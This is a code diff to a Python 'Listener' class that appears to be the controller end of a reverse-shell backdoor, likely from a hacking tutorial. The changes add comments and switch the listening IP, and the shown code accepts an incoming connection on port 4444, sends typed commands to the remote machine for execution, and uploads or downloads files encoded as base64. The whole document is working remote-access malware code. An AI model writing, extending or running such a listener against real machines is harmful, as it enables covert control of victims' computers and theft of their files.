@@ -12,10 +12,12 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Got a connection from" + str(address))
 
+    # Function to send data	
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
 
+    # Function to receive data
     def reliable_receive(self):
         json_data =""
         while True:
@@ -24,7 +26,8 @@ class Listener:
                 return json.loads(json_data)
             except ValueError:
                 continue
-
+                
+    # Function to execute command remotely
     def execute_remotely(self, command):
         self.reliable_send(command)
         if command[0] == "exit":
@@ -32,15 +35,18 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    # Function to write files	
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download successful."
 
+    # Function to read files
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
+   # Function that looks for key words to run specific function commands
     def run(self):
         while True:
             command = raw_input(">> ")
@@ -60,6 +66,6 @@ class Listener:
 
             print(result)
 
-# Enter in listener IP Address and port
-my_listener = Listener("192.168.1.99", 4444)
+# Enter in listener computers IP Address and port
+my_listener = Listener("192.168.1.105", 4444)
 my_listener.run()
